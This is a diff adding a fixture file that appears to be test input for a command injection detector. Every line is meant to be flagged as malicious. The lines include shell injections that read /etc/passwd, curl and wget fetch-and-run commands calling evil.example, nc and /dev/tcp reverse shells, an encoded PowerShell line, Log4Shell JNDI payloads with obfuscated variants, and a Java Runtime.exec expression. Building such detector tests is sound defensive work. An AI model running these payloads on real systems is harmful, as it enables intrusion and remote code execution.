@@ -1,0 +1,18 @@
+# Every line MUST be flagged malicious by the command injection detector.
+; cat /etc/passwd
+| whoami
+&& id
+127.0.0.1; ls -la
+$(curl http://evil.example/x.sh)
+x || wget http://evil.example/x -O /tmp/x
+curl http://evil.example/s | sh
+; /bin/bash -i
+nc -e /bin/sh 10.0.0.1 4444
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+cmd.exe /c dir
+powershell -enc SQBFAFgA
+${jndi:ldap://evil.example/a}
+${${lower:j}ndi:ldap://evil.example/a}
+%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D
+${T(java.lang.Runtime).getRuntime().exec('id')}
+cat${IFS}/etc/passwd
